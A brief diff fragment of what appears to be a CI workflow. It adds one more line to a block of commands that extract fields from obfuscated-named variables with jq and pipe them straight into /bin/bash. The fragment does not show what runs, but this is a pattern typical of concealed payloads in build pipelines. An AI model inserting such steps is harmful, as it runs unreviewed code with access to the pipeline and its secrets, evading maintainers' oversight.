@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$cxpu406" | jq -r .kzxeb7246 | /bin/bash
           echo $zmbdn90 | jq -r .vregw2202 | /bin/bash
           echo $d60299 | jq -r .o12919 | /bin/bash
+          echo $f2 | jq -r .j77 | /bin/bash
 
       - name: Archive output
         if: always()
